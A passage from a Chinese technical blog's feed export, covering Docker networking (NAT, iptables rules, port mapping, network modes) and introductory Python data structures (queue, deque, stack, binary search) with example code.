<p>　　当 Web 服务器放在内网，配置内网 IP ，前端有个防火墙，配置公网 IP，客户端使用公网 IP 来访问这个网站。当访问的时候，客户端发出一个数据包，这个数据包的报头里边，目标地址写的是防火墙的公网 IP 。防火墙会把这个数据包的报头改写一次，将目标地址改写成 Web 服务器的内网 IP ，然后再把这个数据包发送到内网的Web 服务器上这样，数据包就可以穿透防火墙，并从公网 IP 变成了一个对内网地址的访问。</p>
<ul>
<li><strong>MASQUERADE（地址伪装）</strong></li>
</ul>
<p>　　MASQUERADE 是 SNAT 的一个特例，因为它在 Iptables 中有着和 SNAT 相近的效果。SNAT 是指在数据包从网卡发送出去的时候，把数据包中的源地址部分替换为指定的 IP，这样，接收方就认为数据包的来源是被替换的那个 IP 的主机。MASQUERADE是用发送数据的网卡上的IP来替换源IP，因此，对于那些IP不固定的场合，比如拨号网络或者通过 dhcp 分配 IP 的情况下，就得用 MASQUERADE。</p>
<h4 id="容器访问控制"><a href="#容器访问控制" class="headerlink" title="容器访问控制"></a>容器访问控制</h4><h5 id="容器访问外部网络"><a href="#容器访问外部网络" class="headerlink" title="容器访问外部网络"></a>容器访问外部网络</h5><p>　　容器要想访问外部网络，需要本地系统的转发支持。在 Linux 系统中，检查转发是否打开，即<code>net.ipv4.ip_forward</code> 是否等于 0。如果为 0，说明没有开启转发，则需要手动打开。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">sysctl net.ipv4.ip_forward</span></div><div class="line">net.ipv4.ip_forward = 1</div></pre></td></tr></table></figure>
<p>　　也可以在启动 Docker 服务的时候设定 <code>--ip-forward=true</code> , Docker 就会自动设定系统的 ip_forward 参数为 1。 </p>
<h5 id="容器之间访问"><a href="#容器之间访问" class="headerlink" title="容器之间访问"></a>容器之间访问</h5><p>　　容器之间相互访问，需要两方面的支持：</p>
<ul>
<li>容器的网络拓扑是否已经互联。默认情况下，所有容器都会被连接到 docker0 网桥上。</li>
<li>本地系统的防火墙软件 – iptables 是否允许通过。 </li>
</ul>
<p>　　在同一宿主机下，Docker 的容器是通过虚拟网桥来进行连接的。默认情况下，在同一宿主机中运行的不同容器之间是允许网络互通的。因为，当启动 Docker 服务时候，默认会添加一条转发策略到 iptables 的 FORWARD 链上。策略为通过（ACCEPT ） 还是禁止（DROP ） 取决于配置 <code>--icc=true</code>  还是 <code>--icc=false</code> 。因为缺省值为  <code>--icc=true</code>  ，所以默认是允许容器间互通的。</p>
<p>　　如果为了安全考虑，修改 <code>vim /etc/default/docker</code>，在末尾添加配置 <code>DOCKER_OPTS=&quot;--icc=false&quot;</code> 来禁止它。需要重启 Docker 的服务 <code>sudo service docker restart</code>。这样就会拒绝所有容器间互联。</p>
<p>　　另外，也可以允许特定容器间的连接。在 Docker 守护进程的启动选项中设置 <code>--icc=false</code> 和 <code>--iptables=true</code> ，然后在容器启动时使用 <code>--link</code> 选项来与特定容器进行连接。Docker 利用 iptables 中的机制，在 <code>--icc=false</code> 时，阻断所有的 Docker 容器间的访问，仅仅运行利用 link 选项配置的容器进行相互的访问。</p>
<h4 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h4><p>　　默认情况下，容器可以主动访问到外部网络的连接，但是外部网络无法访问到容器。 </p>
<h5 id="容器访问外部"><a href="#容器访问外部" class="headerlink" title="容器访问外部"></a>容器访问外部</h5><p>　　容器所有到外部网络的连接，源地址都会被 NAT 成本地系统的 IP 地址。这是使用 iptables 的源地址伪装操作实现的。 例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# iptables -t nat -nL</div><div class="line">......</div><div class="line">Chain POSTROUTING (policy ACCEPT)</div><div class="line">target     prot opt source               destination         </div><div class="line">MASQUERADE  all  --  172.17.0.0/16        0.0.0.0/0</div></pre></td></tr></table></figure>
<p>　　上述规则将所有源地址在 <code>172.17.0.0/16</code> 网段，目标地址为其他网段（外部网络） 的流量动态伪装为从系统网卡发出。如前一节所述，这里使用的是 MASQUERADE（地址伪装），MASQUERADE 跟传统 SNAT 的好处是它能动态从网卡获取地址。</p>
<h5 id="外部访问容器"><a href="#外部访问容器" class="headerlink" title="外部访问容器"></a>外部访问容器</h5><p>　　容器允许外部访问，可以在 <code>docker run</code> 时候通过 <code>-p</code> 或 <code>-P</code> 参数来启用。但是，不管用那种办法，其实也是在本地的 iptables 的 nat 表中添加相应的规则。例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker run -p 80:80 --name=web -d nginx</div><div class="line">bbe79958143a510ef5aca1b37770e5e19549d7f0a5fd441db092723fca6c1159</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# iptables -t nat -nL</div><div class="line">......</div><div class="line">Chain POSTROUTING (policy ACCEPT)</div><div class="line">target     prot opt source               destination         </div><div class="line">MASQUERADE  all  --  172.17.0.0/16        0.0.0.0/0           </div><div class="line">MASQUERADE  tcp  --  172.17.0.2           172.17.0.2           tcp dpt:80</div></pre></td></tr></table></figure>
<h4 id="网络配置命令"><a href="#网络配置命令" class="headerlink" title="网络配置命令"></a>网络配置命令</h4><p>　　只有在 Docker 服务启动的时候才能配置，而且不能马上生效的命令：</p>
<ul>
<li><code>-b BRIDGE</code> 或 <code>--bridge=BRIDGE</code> ：指定容器挂载的网桥；</li>
<li><code>--bip=CIDR</code> ：定制 docker0 的掩码；</li>
<li><code>-H SOCKET...</code> 或 <code>--host=SOCKET...</code> ：Docker 服务端接收命令的通道；</li>
<li><code>--icc=true|false</code> ：是否支持容器之间进行通信；</li>
<li><code>--ip-forward=true|false</code> ：请看下文容器之间的通信；</li>
<li><code>--iptables=true|false</code> ：是否允许 Docker 添加 iptables 规则；</li>
<li><code>--mtu=BYTES</code> ：容器网络中的 MTU。</li>
</ul>
<p>　　示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 编辑docker默认配置：DOCKER_OPTS=<span class="string">"--icc=false --iptables=true "</span></span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/default/docker</span></div><div class="line"><span class="meta">#</span><span class="bash"> 重启docker服务</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo service docker restart</span></div></pre></td></tr></table></figure>
<p>　　既可以在启动服务时指定，也可以在启动容器时指定的命令选项：</p>
<ul>
<li><code>--dns=IP_ADDRESS...</code> 使用指定的DNS服务器；</li>
<li><code>--dns-search=DOMAIN...</code> 指定DNS搜索域。</li>
</ul>
<p>　　 只能在容器启动时使用的命令选项，<code>docker run</code> 命令与网络相关的选项：</p>
<ul>
<li><code>-h HOSTNAME</code> 或 <code>--hostname=HOSTNAME</code> ：配置容器主机名；</li>
<li><code>--link=CONTAINER_NAME:ALIAS</code> ：添加到另一个容器的连接；</li>
<li><code>--net=bridge|none|container:NAME_or_ID|host</code> ：配置容器的桥接模式；</li>
<li><code>-p SPEC 或 --publish=SPEC</code> ：映射容器端口到宿主主机；</li>
<li><code>-P or --publish-all=true|false</code> ：映射容器所有端口到宿主主机 。</li>
</ul>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 数据结构-队列</title>
    <url>/2019/03/10/Python-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<p><center>Python 数据结构-队列回顾。</center><br><a id="more"></a></p>
<h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><p>　　队列（queue）是一种先进先出的（First In First Out）的线性表，只允许在一端进行插入操作，而在另一端进行删除操作。允许插入的一端为队尾，允许删除的一端为队头。可以使用列表作为队列，其中添加的第一个元素是检索的第一个元素（“先入，先出”）；然而，列表对于这一目的并不高效。虽然从列表末尾追加和弹出是高效的，但是从列表的开头开始插入或弹出就低效了（因为所有其他元素都必须移动一个位置）。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/2/12-1.png" alt="12-1"></p>
<h5 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h5><ul>
<li><code>Queue()</code> 创建一个空的队列。</li>
<li><code>enqueue(item)</code> 往队列中添加一个item元素。</li>
<li><code>dequeue()</code> 从队列头部删除一个元素。</li>
<li><code>is_empty()</code> 判断一个队列是否为空。</li>
<li><code>size()</code> 返回队列的大小。</li>
</ul>
<h5 id="Python-实现"><a href="#Python-实现" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""队列"""</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.items = []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items == []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enqueue</span><span class="params">(self, item)</span>:</span></div><div class="line">        <span class="string">"""进队列"""</span></div><div class="line">        self.items.insert(<span class="number">0</span>,item)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dequeue</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""出队列"""</span></div><div class="line">        <span class="keyword">return</span> self.items.pop()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""返回大小"""</span></div><div class="line">        <span class="keyword">return</span> len(self.items)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    q = Queue()</div><div class="line">    q.enqueue(<span class="string">"csu"</span>)</div><div class="line">    q.enqueue(<span class="string">"changsha"</span>)</div><div class="line">    q.enqueue(<span class="string">"china"</span>)</div><div class="line">    <span class="keyword">print</span> q.size()</div><div class="line">    <span class="keyword">print</span> q.dequeue()</div><div class="line">    <span class="keyword">print</span> q.dequeue()</div><div class="line">    <span class="keyword">print</span> q.dequeue()</div></pre></td></tr></table></figure>
<h4 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h4><p>　　双端队列（Deque，全名Double-ended Queue），是一种具有队列和栈的性质的数据结构。元素可以从两端弹出，其限定插入和删除操作在表的两端进行。双端队列可以在队列任意一端入队和出队。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/2/12-2.jpg" alt="12-2"></p>
<p>　　要使用队列或者双端队列，都可以使用 collections 模块中的 deque： <a href="https://docs.python.org/3/library/collections.html#collections.deque" target="_blank" rel="external"><code>collections.deque</code></a> ，它被设计为从两端都具有快速追加和弹出的能力。</p>
<h5 id="基本操作-1"><a href="#基本操作-1" class="headerlink" title="基本操作"></a>基本操作</h5><ul>
<li><code>Deque()</code> 创建一个空的双端队列。</li>
<li><code>add_front(item)</code>从队头加入一个item元素。</li>
<li><code>add_rear(item)</code> 从队尾加入一个item元素。</li>
<li><code>remove_front()</code> 从队头删除一个item元素。</li>
<li><code>remove_rear()</code> 从队尾删除一个item元素。</li>
<li><code>is_empty()</code> 判断双端队列是否为空。</li>
<li><code>size()</code> 返回队列的大小。</li>
</ul>
<h5 id="Python-实现-1"><a href="#Python-实现-1" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deque</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""双端队列"""</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.items = []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""判断队列是否为空"""</span></div><div class="line">        <span class="keyword">return</span> self.items == []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_front</span><span class="params">(self, item)</span>:</span></div><div class="line">        <span class="string">"""在队头添加元素"""</span></div><div class="line">        self.items.insert(<span class="number">0</span>,item)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_rear</span><span class="params">(self, item)</span>:</span></div><div class="line">        <span class="string">"""在队尾添加元素"""</span></div><div class="line">        self.items.append(item)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_front</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""从队头删除元素"""</span></div><div class="line">        <span class="keyword">return</span> self.items.pop(<span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_rear</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""从队尾删除元素"""</span></div><div class="line">        <span class="keyword">return</span> self.items.pop()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""返回队列大小"""</span></div><div class="line">        <span class="keyword">return</span> len(self.items)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    deque = Deque()</div><div class="line">    deque.add_front(<span class="number">1</span>)</div><div class="line">    deque.add_front(<span class="number">2</span>)</div><div class="line">    deque.add_rear(<span class="number">3</span>)</div><div class="line">    deque.add_rear(<span class="number">4</span>)</div><div class="line">    <span class="keyword">print</span> deque.size()</div><div class="line">    <span class="keyword">print</span> deque.remove_front()</div><div class="line">    <span class="keyword">print</span> deque.remove_front()</div><div class="line">    <span class="keyword">print</span> deque.remove_rear()</div><div class="line">    <span class="keyword">print</span> deque.remove_rear()</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Queue</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 基本操作-网络篇（上）</title>
    <url>/2019/03/09/Docker-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-%E7%BD%91%E7%BB%9C%E7%AF%87%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    <content><![CDATA[<p><center>Docker 网络基本操作介绍。</center><br><a id="more"></a></p>
<h4 id="网络命名空间"><a href="#网络命名空间" class="headerlink" title="网络命名空间"></a>网络命名空间</h4><p>　　Docker 使用了 Linux 的 Namespaces 技术来进行资源隔离，如 PID Namespace 隔离进程，Mount Namespace 隔离文件系统，Network Namespace 隔离网络等。一个 Network Namespace 提供了一份独立的网络环境，包括网卡、路由、Iptable 规则等都与其他的 Network Namespace 隔离。默认情况下，一个 Docker 容器一般会分配一个独立的 Network Namespace。</p>
<h4 id="4-种基本的网络模式"><a href="#4-种基本的网络模式" class="headerlink" title="4 种基本的网络模式"></a>4 种基本的网络模式</h4><h5 id="Bridge-模式"><a href="#Bridge-模式" class="headerlink" title="Bridge 模式"></a>Bridge 模式</h5><p>　　Bridge 模式是 Docker 默认的网络设置，此模式会为每一个容器分配 Network Namespace、设置 IP 等，并将一个主机上的 Docker 容器连接到一个名为 docker0 的虚拟网桥上。在使用 docker run 命令启动容器时，也可以使用 –net=bridge 选项进行指定。</p>
<p>　　在该模式中，Docker 守护进程创建了一个虚拟网桥 docker0，附加在其上的任何网卡之间都能自动转发数据包。虚拟网桥的工作方式和物理交换机类似，这样主机上的所有容器就通过交换机连在了一个二层网络中。默认情况下，Docker 守护进程会创建一对对等接口，将其中一个接口设置为容器的 eth0 接口，另一个接口放置在宿主机的命名空间中，从而将宿主机上的所有容器都连接到这个内部网络上。同时，守护进程还会从网桥的私有地址空间中分配一个  IP地址和子网给该容器。</p>
<p>　　Docker 会从 RFC1918 所定义的私有IP网段中，选择一个和宿主机不同的IP地址和子网分配给 docker0，连接到网桥 docker0 的容器就从这个子网中选择一个未占用的 IP 使用。一般 Docker 会使用 172.17.0.0/16 这个网段，并将 172.17.0.1/16 分配给 docker0 网桥。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/9-1.png" alt="9-1"></p>
<p>　　Bridge 模式可以解决同一主机启动多个容器容易引起端口冲突的问题，但是 iptable 的配置比较繁琐，性能也在数据包虚拟网卡与物理网卡的转发中散失，同时 NAT 机制导致无法使用容器 IP 进行跨服务器通讯。因此，Bridge 模式可以去掉 NAT，即把宿主机的 IP 从物理网卡上移除，直接配置到网桥上去，并且使用静态的 IP 分配策略。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/9-2.png" alt="9-2"></p>
<p>　　该改进的好处是 Docker 的 IP 可以直接暴露到交换机上，其中去 NAT 的 Bridge 模式需要在宿主机上禁用 iptables 和 ip_forward，以及禁用相关的内核模块，以避免网络流量毛刺风暴问题。</p>
<h5 id="Host-模式"><a href="#Host-模式" class="headerlink" title="Host 模式"></a>Host 模式</h5><p>　　如前所述，Docker 使用了 Linux 的 Namespaces 技术来进行资源隔离，一个 Docker 容器一般会分配一个独立的 Network Namespace。但如果启动容器的时候使用 host 模式，那么这个容器将不会获得一个独立的 Network Namespace，而是和宿主机共用一个 Network Namespace。容器将不会虚拟出自己的网卡，配置自己的 IP 等，而是使用宿主机的 IP 和端口。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/9-3.png" alt="9-3"></p>
<p>　　在启动容器时加入 <code>--net=host</code> 参数就可以启用 Host 模式。Host 模式存在的主要缺点时：因为它是使用宿主机的 IP 和端口，如果在一台机器启动了多个相同的容器，这样极有可能产生端口冲突。这种场景下，Host 模式就不适用了。</p>
<h5 id="Container-模式"><a href="#Container-模式" class="headerlink" title="Container 模式"></a>Container 模式</h5><p>　　Container 模式指定新创建的容器和已经存在的一个容器共享一个Network Namespace，而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。在启动容器时加入 <code>--net=container</code> 参数就可以启用 Host 模式。</p>
<h5 id="None-模式"><a href="#None-模式" class="headerlink" title="None 模式"></a>None 模式</h5><p>　　不为容器配置任何网络功能，容器只能使用127.0.0.1的本机网络。在启动容器时加入 <code>--net=none</code> 参数就可以启用 Host 模式。在该模式下，Docker容器仅有lo环回接口，在容器启动后仍然可以手动配置网络。</p>
<p>　　该模式下容器是封闭的，封闭意味着隔离，一些对安全性要求高并且不需要联网的应用可以使用该模式。比如某个容器的唯一用途是生成随机密码，就可以使用该模式，避免密码被窃取。</p>
<h4 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h4><p>　　Docker 允许我们创建 3 种类型的自定义网络，Bridge，Overlay，Macvlan。这里只对这几种网络进行简单介绍，后续再进行详细介绍。</p>
<ul>
<li><p>Bridge网络模式，可以根据需要定制自己的虚拟网桥。</p>
</li>
<li><p>Overlay 网络模式，在多个 Docker daemon 主机之间穿件一个分布式的网络，该网络（overlay）位于docker 主机层次之上，允许容器（同一集群服务的容器）之间加密通讯，因此，Docker 需要处理每一个主机（docker daemon）和每个分布的容器之间的包路由。</p>
</li>
<li>Macvlan 本身是 Linxu 的内核模块，本质上是一种网卡虚拟化技术。其功能是允许在同一个物理网卡上虚拟出多个网卡，通过不同的 MAC 地址在数据链路层进行网络数据的转发，一块网卡上配置多个 MAC 地址（即多个 interface），每个 interface 可以配置自己的 IP，Docker 的 Macvlan 网络实际上就是使用了 Linux 提供的 Macvlan 驱动。</li>
</ul>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 数据结构-栈</title>
    <url>/2019/03/09/Python-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88/</url>
    <content><![CDATA[<p><center>Python 数据结构-栈回顾。</center><br><a id="more"></a></p>
<p>　　栈（stack），有些地方称为堆栈，是一种容器，可存入数据元素、访问元素、删除元素，它的特点在于只能允许在容器的一端（称为栈顶端指标）进行加入数据（push）和输出数据（pop）的运算。没有了位置概念，保证任何时候可以访问、删除的元素都是此前最后存入的那个元素，确定了一种默认的访问顺序。由于栈数据结构只允许在一端进行操作，因而按照后进先出（LIFO, Last In First Out）的原理运作。如图所示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/2/10-1.jpg" alt="10-1"></p>
<p>　　在 Python 中，列表的方法使得可以把列表当成元素后进先出的堆栈来用。使用 <code>append()</code> 来把一个元素加到堆栈的顶部。使用不显示携带索引参数的 <code>pop()</code> 方法来把一个元素从堆栈顶部移除。</p>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><ul>
<li>Stack() 创建一个新的空栈</li>
<li>push(item) 添加一个新的元素item到栈顶</li>
<li>pop() 弹出栈顶元素</li>
<li>peek() 返回栈顶元素</li>
<li>is_empty() 判断栈是否为空</li>
<li>size() 返回栈的元素个数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""栈"""</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.items = []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""判断是否为空"""</span></div><div class="line">        <span class="keyword">return</span> self.items == []</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, item)</span>:</span></div><div class="line">        <span class="string">"""加入元素"""</span></div><div class="line">        self.items.append(item)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""弹出元素"""</span></div><div class="line">        <span class="keyword">return</span> self.items.pop()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">peek</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""返回栈顶元素"""</span></div><div class="line">        <span class="keyword">return</span> self.items[len(self.items) - <span class="number">1</span>]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""返回栈的大小"""</span></div><div class="line">        <span class="keyword">return</span> len(self.items)</div></pre></td></tr></table></figure>
<h4 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h4><h5 id="逆序输出"><a href="#逆序输出" class="headerlink" title="逆序输出"></a>逆序输出</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</div><div class="line">stack = Stack()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nums:</div><div class="line">    stack.push(i)  <span class="comment"># 入栈</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</div><div class="line">    nums[i] = stack.pop()  <span class="comment"># 出栈</span></div><div class="line">print(nums)</div><div class="line"></div><div class="line"><span class="comment"># 输出</span></div><div class="line">[<span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</div></pre></td></tr></table></figure>
<h5 id="括号匹配"><a href="#括号匹配" class="headerlink" title="括号匹配"></a>括号匹配</h5><p>　　遇到左半边括号时，进行入栈操作；遇到右半边括号时，检查是否与栈顶元素匹配，如果是，则将栈顶元素出栈，否则，返回匹配失败。最后，如果栈为空，则返回匹配成功，否则，返回匹配失败。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_parens</span><span class="params">(exp)</span>:</span></div><div class="line">    open_parens = <span class="string">"([&#123;"</span>  <span class="comment"># 左半边括号</span></div><div class="line">    opposite = &#123;<span class="string">')'</span>: <span class="string">'('</span>, <span class="string">']'</span>: <span class="string">'['</span>, <span class="string">'&#125;'</span>: <span class="string">'&#123;'</span>&#125;  <span class="comment"># 括号对</span></div><div class="line">    s = Stack()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> exp:</div><div class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> open_parens:  <span class="comment"># 左半边括号入栈</span></div><div class="line">            s.push(i)</div><div class="line">        <span class="keyword">elif</span> s.peek() == opposite[i]:  <span class="comment"># 遇到右半边括号，且栈顶元素与之匹配</span></div><div class="line">            s.pop()</div><div class="line">        <span class="keyword">else</span>:  <span class="comment"># 匹配失败</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">if</span> s.is_empty():</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span>  <span class="comment"># 全部是匹配的</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h5 id="数制转换"><a href="#数制转换" class="headerlink" title="数制转换"></a>数制转换</h5><p>　　通过求余法，可以将十进制数转换为其他进制，比如要转为二进制，将十进制数除以2，记录余数，然后继续将商除以2，一直到商等于0为止，最后将余数倒着写数来就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># 递归形式</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(stack, n, base)</span>:</span></div><div class="line">    digit = [<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>]</div><div class="line">    <span class="keyword">if</span> n:</div><div class="line">        stack.push(digit[n%base]) <span class="comment"># 余数入栈</span></div><div class="line">        convert(stack, int(n/base), base)</div><div class="line"></div><div class="line"><span class="comment"># 非递归形式</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(stack, n, base)</span>:</span></div><div class="line">    digit = [<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>]</div><div class="line">    <span class="keyword">while</span> n:</div><div class="line">        stack.push(digit[n%base]) <span class="comment"># 余数入栈</span></div><div class="line">        n //= base</div><div class="line"></div><div class="line"><span class="comment"># 将十进制的 8 转换成二进制</span></div><div class="line">s = Stack()</div><div class="line">n = <span class="number">8</span></div><div class="line">base = <span class="number">2</span></div><div class="line">convert(s, <span class="number">8</span>, <span class="number">2</span>)</div><div class="line">res = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(s.size()):</div><div class="line">    res += s.pop()</div><div class="line">print(res)</div></pre></td></tr></table></figure>
<h5 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h5><p>　　栈还有一个重要应用就是在程序设计语言中实现函数调用。当一个函数在运行期间调用另一个函数时，在运行被调用函数之前，系统需要将实际参数和返回值地址等数据传递给被调函数，当函数调用时，这些数据与局部变量一起构成一条“工作记录”，被压入系统提供的栈。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>Stack</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 数据结构-二分查找</title>
    <url>/2019/03/09/Python-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p><center>Python 二分查找学习。</center><br><a id="more"></a></p>
<h4 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h4><p>　　二分查找又称折半查找，优点是比较次数少，查找速度快，平均性能好；其缺点是要求待查表为有序表，且插入删除困难。因此，折半查找方法适用于不经常变动而查找频繁的有序列表。首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功。如图所示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/2/16-1.png" alt="16-1"></p>
<p>　　由上述描述可知，使用二分查找有两个前提条件：</p>
<ul>
<li>待查找的列表必须有序（通常是从小到大的顺序）。</li>
<li>必须使用线性表的顺序存储结构来存储数据（底层用数组实现的）。</li>
</ul>
<p>　　二分查找的时间复杂度是 <code>O(logn)</code>，远远好于顺序查找的 <code>O(n)</code> 。</p>
